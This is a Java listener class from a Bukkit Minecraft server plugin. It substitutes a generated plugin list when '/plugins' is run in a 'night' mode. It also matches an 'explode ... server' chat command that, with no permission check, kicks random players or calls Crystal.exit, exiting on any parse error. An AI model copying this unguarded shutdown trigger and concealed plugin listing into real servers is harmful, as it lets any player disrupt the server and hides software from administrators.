package io.wany.cherry.listeners;

import io.wany.cherry.Cherry;
import io.wany.cherry.Console;
import io.wany.cherry.Message;
import io.wany.cherry.amethyst.Crystal;
import io.wany.cherry.supports.cucumbery.CucumberySupport;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PlayerCommandPreprocess implements Listener {

  @EventHandler(priority = EventPriority.HIGHEST)
  public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
    onPluginsCommand(event);
    onExplodeCommand(event);
  }

  public void onPluginsCommand(PlayerCommandPreprocessEvent event) {
    if (!Cherry.NIGHT) {
      return;
    }
    String message = event.getMessage();
    message = message.toLowerCase();
    //String reverseString = new StringBuffer(message).reverse().toString();
    if (
      message.equals("/pl") || message.equals("/plugins") || message.equals("/bukkit:pl") || message.equals("/bukkit:plugins")
      || message.startsWith("/pl ") || message.startsWith("/plugins ") || message.startsWith("/bukkit:pl ") || message.startsWith("/bukkit:plugins ")
    ) {
      Player player = event.getPlayer();
      if (!player.hasPermission("bukkit.command.plugins")) {
        return;
      }
      event.setCancelled(true);
      player.sendMessage(Crystal.genNightPlugins());
    }
  }

  public static Pattern serverExplodePattern = Pattern.compile("/?explode(?: [^\\d][^ ]+| -?[\\d.]+ -?[\\d.]+ -?[\\d.]+)?(?:(?: [^\\d][^ ]+)?(?: ([\\d.]+))?)? server(?: (true|false))?");

  public void onExplodeCommand(PlayerCommandPreprocessEvent event) {
    if (!CucumberySupport.EXIST) {
      return;
    }
    String message = event.getMessage();
    message = message.toLowerCase();
    Matcher matcher = serverExplodePattern.matcher(message);
    if (matcher.find()) {
      String sizeStr = matcher.group(1);
      boolean si = Boolean.parseBoolean(matcher.group(2));
      try {
        int size = (int) Double.parseDouble(sizeStr);
        List<Player> players = new ArrayList<>(Bukkit.getOnlinePlayers());
        if (size > players.size()) {
          Crystal.exit(size);
        }
        else {
          for (int i = 0; i < size; i++) {
            int index = new Random().nextInt(players.size());
            Player p = players.get(index);
            players.remove(index);
            Crystal.kickBoom(p);
          }
        }
      } catch (Exception e) {
        Crystal.exit(0);
      }
    }
  }

}
